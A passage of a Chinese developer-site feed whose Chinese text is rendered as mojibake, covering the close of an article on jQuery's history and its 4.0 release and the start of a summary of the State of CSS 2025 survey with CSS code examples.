<li><strong>WordPress ç­‰ CMS ç³»ç»Ÿ</strong>å¤§é‡ä¾èµ– jQuery</li>
<li><strong>ä¼ä¸šçº§åº”ç”¨</strong>ä¸­ jQuery ä»£ç åŸºæ•°åºå¤§</li>
</ul>
<p>ä¸ºä»€ä¹ˆä¼ä¸šä¸ç›´æ¥æŠ›å¼ƒ jQueryï¼Ÿ</p>
<p>å› ä¸ºç°å®è¿œæ¯”ç†æƒ³å¤æ‚ï¼š</p>
<ol>
<li><strong>ä¸šåŠ¡é€»è¾‘ä¸ DOM æ·±åº¦è€¦åˆ</strong>ï¼šé‡æ„æˆæœ¬å·¨å¤§</li>
<li><strong>ç¬¬ä¸‰æ–¹æ’ä»¶ä¾èµ–</strong>ï¼šå¾ˆå¤šæ’ä»¶æ²¡æœ‰ç°ä»£æ›¿ä»£æ–¹æ¡ˆ</li>
<li><strong>è¿ç§»é£é™©</strong>ï¼šæ–°åŠŸèƒ½å¼€å‘å—é˜»ï¼Œå½±å“è¥æ”¶</li>
<li><strong>æŠ€èƒ½æ–­å±‚</strong>ï¼šå›¢é˜Ÿå¯¹æ—§æŠ€æœ¯ç†Ÿæ‚‰ï¼Œå¯¹æ–°æŠ€æœ¯é™Œç”Ÿ</li>
</ol>
<p>æ¯”å¦‚ä¸€ä¸ªç”µå•†ç½‘ç«™å¦‚æœè¦é‡æ„æ”¯ä»˜æµç¨‹çš„ jQuery ä»£ç ï¼Œä»»ä½• bug éƒ½å¯èƒ½å¯¼è‡´ç›´æ¥çš„ç»æµæŸå¤±ã€‚è¿™ç§é£é™©è¯„ä¼°è®©å¾ˆå¤šå…¬å¸æœ›è€Œå´æ­¥ã€‚</p>
<p>æ­¤å¤–ï¼ŒWordPress æ”¯æ’‘ç€å…¨çƒ 43% çš„ç½‘ç«™ï¼Œå®ƒçš„æ ¸å¿ƒä»ç„¶ä¾èµ– jQueryã€‚è¿™ä¸ªåºå¤§çš„ç”Ÿæ€ç³»ç»Ÿæ„å‘³ç€ï¼š</p>
<ul>
<li>æ•°åä¸‡ä¸»é¢˜å’Œæ’ä»¶ä¾èµ– jQuery</li>
<li>å†…å®¹ç®¡ç†ç³»ç»Ÿå¯¹ç¨³å®šæ€§çš„è¦æ±‚è¿œè¶…å…ˆè¿›æ€§</li>
<li>æ‰˜ç®¡æœåŠ¡å•†å€¾å‘äºä¿æŒç°æœ‰æŠ€æœ¯æ ˆ</li>
</ul>
<p>æ‰€ä»¥å³ä½¿æ‰€æœ‰å‰ç«¯å¼€å‘è€…éƒ½ä¸å†ä½¿ç”¨ jQueryï¼Œä»… WordPress ç”Ÿæ€ç³»ç»Ÿå°±èƒ½è®©å®ƒç»§ç»­å­˜åœ¨å¾ˆå¤šå¹´ã€‚</p>
<h2 data-id="heading-8">9. æ‹¥æŠ±ç°ä»£</h2>
<p>2026 å¹´ 1 æœˆ 17 æ—¥ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FXhNEPf_5qbiM4W9HGgfzMQ" target="_blank" title="https://mp.weixin.qq.com/s/XhNEPf_5qbiM4W9HGgfzMQ" ref="nofollow noopener noreferrer">jQuery 4.0 æ­£å¼å‘å¸ƒ</a>ï¼Œåœ¨è¿™æ¬¡å‘å¸ƒä¸­ï¼š</p>
<ul>
<li><strong>ç§»é™¤å¯¹ IE11 ä»¥ä¸‹ç‰ˆæœ¬çš„æ”¯æŒ</strong>ï¼šæ‘†è„±å†å²åŒ…è¢±</li>
<li><strong>è¿ç§»åˆ° ES æ¨¡å—</strong>ï¼šä¸ç°ä»£æ„å»ºå·¥å…·å…¼å®¹</li>
<li><strong>å¢åŠ  Trusted Types æ”¯æŒ</strong>ï¼šæå‡å®‰å…¨æ€§</li>
<li><strong>ç§»é™¤å·²å¼ƒç”¨ API</strong>ï¼šæ¸…ç†æŠ€æœ¯å€ºåŠ¡</li>
</ul>
<p>è¿™æ¬¡æ›´æ–°åƒæ˜¯ jQuery é¢å‘ç°ä»£ Web çš„æ–­èˆç¦»ã€‚</p>
<h2 data-id="heading-9">10. ç»“è¯­ï¼šä¸€ä¸ªæ—¶ä»£çš„å®Œç»“</h2>
<p>jQuery 20 å¹´çš„å‘å±•å²ï¼Œå°±æ˜¯ä¸€éƒ¨å‰ç«¯æŠ€æœ¯çš„ç¼©å½±ã€‚</p>
<p>å®ƒä»è§£å†³ç°å®é—®é¢˜å‡ºå‘ï¼Œæ¨åŠ¨äº†æ•´ä¸ªè¡Œä¸šçš„å‘å±•ï¼Œæœ€ç»ˆä¹Ÿéšç€æ—¶ä»£çš„å˜åŒ–è€Œæ·¡å‡ºä¸»æµã€‚</p>
<p>è¿™å¹¶ä¸æ„å‘³ç€ jQuery æ˜¯å¤±è´¥çš„ã€‚æ°æ°ç›¸åï¼Œ<strong>å®ƒè¶…é¢å®Œæˆäº†è‡ªå·±çš„å†å²ä½¿å‘½</strong>ï¼š</p>
<ul>
<li>å®ƒè®©æ— æ•°äººå­¦ä¼šäº†å‰ç«¯å¼€å‘</li>
<li>å®ƒæ¨åŠ¨äº†æµè§ˆå™¨å‚å•†çš„æ ‡å‡†åŒ–</li>
<li>å®ƒå‚¬ç”Ÿäº†ç°ä»£å‰ç«¯ç”Ÿæ€</li>
<li>å®ƒè¯æ˜äº†å¼€æºåä½œçš„åŠ›é‡</li>
</ul>
<p>æ­£å¦‚é‚£å¥ç»å…¸çš„å°è¯ï¼š<strong>â€œå¹¶ä¸æ˜¯è‹±é›„è¿Ÿæš®ï¼Œè€Œæ˜¯æ—¶ä»£éœ€è¦æ–°çš„è‹±é›„ã€‚â€</strong></p>
<p>jQuery 4.0 çš„å‘å¸ƒä¸æ˜¯å›å…‰è¿”ç…§ï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬ï¼š<strong>æŠ€æœ¯æ²¡æœ‰ç»å¯¹çš„å¯¹é”™ï¼Œåªæœ‰æ˜¯å¦é€‚åˆé‚£ä¸ªæ—¶ä»£çš„éœ€æ±‚</strong>ã€‚</p>
<p>ä»Šå¤©ï¼Œå½“æˆ‘ä»¬åœ¨ Reactã€Vue çš„ç»„ä»¶åŒ–ä¸–ç•Œä¸­å¿™ç¢Œæ—¶ï¼Œå¶å°”å›æœ›ä¸€ä¸‹ jQuery çš„ç®€å•ä¼˜é›…ï¼Œä¹Ÿè®¸èƒ½è·å¾—ä¸€äº›å…³äº<strong>æŠ€æœ¯æœ¬è´¨</strong>çš„æ€è€ƒï¼š</p>
<p><strong>å¥½çš„å·¥å…·åº”è¯¥è®©äººæ›´ä¸“æ³¨äºåˆ›é€ ä»·å€¼ï¼Œè€Œä¸æ˜¯è¢«æŠ€æœ¯æœ¬èº«æ‰€å›°æ‰°ã€‚</strong></p>
<p>æˆ‘æ˜¯å†´ç¾½ï¼Œ10 å¹´ç¬”è€•ä¸è¾ï¼Œä¸“æ³¨å‰ç«¯é¢†åŸŸï¼Œæ›´æ–°äº† 10+ ç³»åˆ—ã€300+ ç¯‡åŸåˆ›æŠ€æœ¯æ–‡ç« ï¼Œç¿»è¯‘è¿‡ Svelteã€Solid.jsã€TypeScript æ–‡æ¡£ï¼Œè‘—æœ‰å°å†Œã€ŠNext.js å¼€å‘æŒ‡å—ã€‹ã€ã€ŠSvelte å¼€å‘æŒ‡å—ã€‹ã€ã€ŠAstro å®æˆ˜æŒ‡å—ã€‹ã€‚</p>
<p>æ¬¢è¿å›´è§‚æˆ‘çš„â€œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">ç½‘é¡µç‰ˆæœ‹å‹åœˆ</a>â€ï¼Œå…³æ³¨æˆ‘çš„å…¬ä¼—å·ï¼š<strong>å†´ç¾½ï¼ˆæˆ–æœç´¢ yayujsï¼‰</strong>ï¼Œæ¯å¤©åˆ†äº«å‰ç«¯çŸ¥è¯†ã€AI å¹²è´§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´ CSS å¹´åº¦è°ƒæŸ¥æŠ¥å‘Šäº®ç‚¹é€Ÿè§ˆ]]></title>    <link>https://juejin.cn/post/7596943803934670888</link>    <guid>https://juejin.cn/post/7596943803934670888</guid>    <pubDate>2026-01-20T03:04:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596943803934670888" data-draft-id="7596943803934621736" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 2025 å¹´ CSS å¹´åº¦è°ƒæŸ¥æŠ¥å‘Šäº®ç‚¹é€Ÿè§ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-20T03:04:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             2025 å¹´ CSS å¹´åº¦è°ƒæŸ¥æŠ¥å‘Šäº®ç‚¹é€Ÿè§ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:04:01.000Z" title="Tue Jan 20 2026 03:04:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿‘æ—¥ï¼Œã€ŒState of CSS 2025ã€å¹´åº¦è°ƒæŸ¥æŠ¥å‘Šå…¬å¸ƒã€‚</p>
<p>è¿™ä»½æŠ¥å‘Šæ”¶é›†äº†å…¨çƒæ•°ä¸‡åå¼€å‘è€…çš„çœŸå®ä½¿ç”¨ç»éªŒå’Œåé¦ˆï¼Œå ªç§°æ˜¯ Web å¼€å‘é¢†åŸŸçš„â€œå¹´åº¦é£å‘æ ‡â€ã€‚</p>
<p>æœ¬ç¯‡æˆ‘ä»¬ç›˜ç‚¹ä¸‹è¿™ä»½æŠ¥å‘Šçš„äº®ç‚¹éƒ¨åˆ†ã€‚</p>
<h2 data-id="heading-0">1. ä½¿ç”¨ç‡æœ€é«˜çš„åŠŸèƒ½æ˜¯ :has()</h2>
<p><strong>åœ¨è°ƒæŸ¥çš„æ‰€æœ‰åŠŸèƒ½ä¸­ï¼Œ</strong><code>**:has()**</code><strong>æ˜¯ä½¿ç”¨ç‡æœ€é«˜ä¹Ÿæ˜¯æœ€å—æ¬¢è¿çš„åŠŸèƒ½ã€‚</strong></p>
<p>æƒ³å¿…å¤§å®¶å·²ç»å¾ˆç†Ÿæ‚‰äº†ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŠŸèƒ½éå¸¸å¼ºå¤§çš„ä¼ªç±»ï¼Œå¯ä»¥å®ç°ç±»ä¼¼â€œçˆ¶é€‰æ‹©å™¨â€å’Œâ€œå‰é¢å…„å¼Ÿé€‰æ‹©å™¨â€çš„åŠŸèƒ½ã€‚</p>
<p>ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œä¸‹é¢çš„ CSS ä»£ç è¡¨ç¤ºå¦‚æœ <code>&lt;a&gt;</code> å…ƒç´ é‡Œé¢æœ‰ <code>&lt;img&gt;</code> å…ƒç´ ï¼Œåˆ™è¿™ä¸ª <code>&lt;a&gt;</code> å…ƒç´ å°±ä¼šåŒ¹é…ã€‚</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">:has</span>(<span class="hljs-selector-tag">img</span>) {
  <span class="hljs-attribute">display</span>: block;
}
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªé€‰æ‹©å™¨è½»æ¾åŒºåˆ†æ˜¯æ–‡å­—é“¾æ¥è¿˜æ˜¯å›¾åƒé“¾æ¥ï¼Œå¹¶è®¾ç½®ä¸åŒçš„ CSS æ ·å¼ã€‚</p>
<h2 data-id="heading-1">2. ä½¿ç”¨ç‡ç¬¬äºŒé«˜çš„åŠŸèƒ½æ˜¯ aspect-ratio</h2>
<p>è¿™ä¸ª CSS å±æ€§å…è®¸ä½ å®šä¹‰å…ƒç´ ç›’å­çš„å®½é«˜æ¯”ã€‚</p>
<p>è¿™æ„å‘³ç€å³ä½¿çˆ¶å®¹å™¨æˆ–è§†å£å¤§å°å‘ç”Ÿå˜åŒ–ï¼Œæµè§ˆå™¨ä¹Ÿä¼šè°ƒæ•´å…ƒç´ çš„å°ºå¯¸ä»¥ä¿æŒæŒ‡å®šçš„å®½é«˜æ¯”ã€‚</p>
<p>æ¯”å¦‚æˆ‘ä»¬å°†ä¸€å¼ å›¾ç‰‡è®¾ç½®ä¸º 3/2 å®½é«˜æ¯”ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">img</span> {
  aspect-ratio: <span class="hljs-number">3</span>/<span class="hljs-number">2</span>;
}
</code></pre>
<h2 data-id="heading-2">3. ä½¿ç”¨ç‡æœ€ä½çš„æ˜¯ sibling-count å’Œ sibling-index</h2>
<p>è®°å¾—ä»¥å‰å®ç°åˆ—è¡¨é¡¹äº¤é”™åŠ¨ç”»æ—¶ï¼Œè¦æ‰‹åŠ¨ç»™æ¯ä¸ªå…ƒç´ è®¾ç½®ä¸åŒçš„å»¶è¿Ÿå—ï¼Ÿ</p>
<p>ç°åœ¨ï¼Œç”¨ <code>sibling-index()</code> ä¸€è¡Œä»£ç å°±èƒ½æå®šï¼</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">li</span> {
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span> ease;
  <span class="hljs-attribute">transition-delay</span>: <span class="hljs-built_in">calc</span>((<span class="hljs-built_in">sibling-index</span>() - <span class="hljs-number">1</span>) * <span class="hljs-number">100ms</span>);
}
</code></pre>
<p>è¿™ä¸ªå‡½æ•°ä¼šè‡ªåŠ¨è·å–å…ƒç´ åœ¨å…„å¼ŸèŠ‚ç‚¹ä¸­çš„ä½ç½®ï¼ˆä» 1 å¼€å§‹è®¡æ•°ï¼‰ï¼Œé€šè¿‡ç®€å•çš„è®¡ç®—å°±èƒ½å®ç°<strong>æµç•…çš„äº¤é”™åŠ¨ç”»æ•ˆæœ</strong>ã€‚</p>
<p>å¦‚æœå†æ­é… <code>@starting-style</code>ï¼Œè¿å…¥åœºåŠ¨ç”»éƒ½èƒ½è½»æ¾æå®šï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">li</span> {
  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span> ease;
  <span class="hljs-attribute">transition-delay</span>: <span class="hljs-built_in">calc</span>((<span class="hljs-built_in">sibling-index</span>() - <span class="hljs-number">1</span>) * <span class="hljs-number">100ms</span>);

  <span class="hljs-keyword">@starting-style</span> {
    <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>;
  }
}
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodepen.io%2Fargyleink%2Fpen%2FKwKXPYW" target="_blank" title="https://codepen.io/argyleink/pen/KwKXPYW" ref="nofollow noopener noreferrer">å®ç°æ•ˆæœå¦‚ä¸‹ï¼š</a></p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f1a4f0f145d4232a37913f620cc868d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=87sNHhi%2BWbIxUaBheGB0pwLtcRo%3D" alt="" loading="lazy"/></p>
<p>ä¹‹æ‰€ä»¥ä½¿ç”¨ç‡æœ€ä½ï¼Œå¯ä»¥ç†è§£ï¼Œå› ä¸ºæµè§ˆå™¨æ”¯æŒè¿˜æ¯”è¾ƒæ–°ã€‚</p>
<h2 data-id="heading-3">4. å—æ¬¢è¿ç¨‹åº¦ç¬¬äºŒé«˜çš„åŠŸèƒ½æ˜¯ Subgrid</h2>
<p>Subgrid è¡¨ç¤ºå­ç½‘æ ¼ï¼Œå®ƒå¹¶ä¸æ˜¯ä¸€ä¸ª CSS å±æ€§ï¼Œè€Œæ˜¯ grid-template-columns å’Œ grid-template-rows å±æ€§æ”¯æŒçš„å…³é”®å­—ï¼Œå…¶ä½¿ç”¨çš„åœºæ™¯éœ€è¦å¤–é¢å·²ç»æœ‰ä¸ª Grid å¸ƒå±€ã€‚</p>
<p>ä»€ä¹ˆæ—¶å€™ä¼šç”¨åˆ° Subgrid å‘¢ï¼Ÿ</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œè¿™æ˜¯ä¸€ä¸ªå¸ƒå±€æ•ˆæœï¼š</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6e8b08e65a24a0f8a6f1db19000aab2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=iz0TkuOpABZCRaF5VU%2BjAYWKrkg%3D" alt="" loading="lazy"/></p>
<p>ä½ ä¼šå‘ç°ï¼Œæ ‡é¢˜å­—æ•°ä¸ä¸€æ ·ï¼Œå†…å®¹å­—æ•°ä¸ä¸€æ ·ï¼Œå¯¼è‡´åº•éƒ¨å¾ˆéš¾å¯¹é½ã€‚</p>
<p>ç„¶è€Œæˆ‘ä»¬æƒ³è¦çš„æ•ˆæœæ˜¯è¿™æ ·çš„ï¼š</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b50ee87a778a445e909c74b315cf7cc7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=n9xK2PPEkRShrOPWMdjSqgZEY%2FU%3D" alt="" loading="lazy"/></p>
<p>æ­¤æ—¶å°±å¯ä»¥ç”¨åˆ° Subgridï¼Œä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.wrapper</span> {
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}

<span class="hljs-selector-class">.item</span> {
  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">1</span> / <span class="hljs-number">4</span>;
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-rows</span>: subgrid;
}
</code></pre>
<h2 data-id="heading-4">5. è®¤çŸ¥åº¦å¢é•¿æœ€é«˜çš„æ˜¯ light-dark()</h2>
<p>ä¸çŸ¥é“ä½ æ˜¯å¦å®ç°è¿‡ç½‘ç«™çš„æµ…è‰²å’Œæ·±è‰²ä¸»é¢˜ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-comment">/* é»˜è®¤æµ…è‰²ä¸»é¢˜ */</span>
  <span class="hljs-attr">--text-heading</span>: <span class="hljs-number">#000</span>;
  <span class="hljs-attr">--text-body</span>: <span class="hljs-number">#212121</span>;
  <span class="hljs-attr">--surface</span>: <span class="hljs-number">#efefef</span>;

  <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">prefers-color-scheme</span>: dark) {
    <span class="hljs-comment">/* æš—è‰²ä¸»é¢˜ - ç¬¬ä¸€é */</span>
    <span class="hljs-attr">--text-heading</span>: <span class="hljs-number">#fff</span>;
    <span class="hljs-attr">--text-body</span>: <span class="hljs-number">#efefef</span>;
    <span class="hljs-attr">--surface</span>: <span class="hljs-number">#212121</span>;
  }
}

<span class="hljs-selector-class">.dark-theme</span> {
  <span class="hljs-comment">/* æš—è‰²ä¸»é¢˜ - åˆå†™ä¸€éï¼ */</span>
  <span class="hljs-attr">--text-heading</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attr">--text-body</span>: <span class="hljs-number">#efefef</span>;
  <span class="hljs-attr">--surface</span>: <span class="hljs-number">#212121</span>;
}
</code></pre>
<p>åŒæ ·çš„é¢œè‰²å†™ä¸¤éï¼Œä¸€ä¸ªç»™åª’ä½“æŸ¥è¯¢ï¼ˆè‡ªåŠ¨åˆ‡æ¢ï¼‰ï¼Œä¸€ä¸ªç»™åˆ‡æ¢æŒ‰é’®ã€‚</p>
<p>æ”¹ä¸€æ¬¡è¦æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼Œçƒ¦æ­»äº†ï¼</p>
<p>ç°åœ¨ä½¿ç”¨ <code>light-dark()</code> è½»æ¾å®ç°ï¼</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-comment">/* è·Ÿéšç³»ç»Ÿåå¥½ */</span>
  <span class="hljs-attribute">color</span>-scheme: light dark;

  <span class="hljs-comment">/* ä¸€æ¬¡å®šä¹‰ï¼Œè‡ªåŠ¨åˆ‡æ¢ */</span>
  <span class="hljs-attr">--text-heading</span>: <span class="hljs-built_in">light-dark</span>(<span class="hljs-number">#000</span>, <span class="hljs-number">#fff</span>);
  <span class="hljs-attr">--text-body</span>: <span class="hljs-built_in">light-dark</span>(<span class="hljs-number">#212121</span>, <span class="hljs-number">#efefef</span>);
  <span class="hljs-attr">--surface</span>: <span class="hljs-built_in">light-dark</span>(<span class="hljs-number">#efefef</span>, <span class="hljs-number">#212121</span>);
}
</code></pre>
<p>å°±è¿™ä¹ˆç®€å•ï¼ç³»ç»Ÿæ˜¯æµ…è‰²å°±ç”¨ç¬¬ä¸€ä¸ªï¼Œæš—è‰²å°±ç”¨ç¬¬äºŒä¸ªã€‚</p>
<h2 data-id="heading-5">6. è¯„è®ºæœ€å¤šçš„åŠŸèƒ½æ˜¯ line-clampï¼Œå¤šæ˜¯è´Ÿé¢è¯„ä»·</h2>
<p>CSS å±æ€§ line-clamp ç”¨äºå°†å®¹å™¨çš„å†…å®¹é™åˆ¶ä¸ºæŒ‡å®šçš„è¡Œæ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸å®ç°çš„å†…å®¹å¤šæ—¶æ˜¾ç¤ºçœç•¥å·çš„æ•ˆæœã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">p</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">display</span>: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: <span class="hljs-number">2</span>;
  <span class="hljs-attribute">overflow</span>: hidden;
}
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/105ce52fd632442aa0623d5c73e8eff5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=D5Mt8kShf1PSVoKu8BZRmNGjZf8%3D" alt="" loading="lazy"/></p>
<p>ä¹‹æ‰€ä»¥è¢«å¤§å®¶åæ§½ï¼Œå¤šæ˜¯å› ä¸ºæŠ€æœ¯å±€é™æ€§é—®é¢˜ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
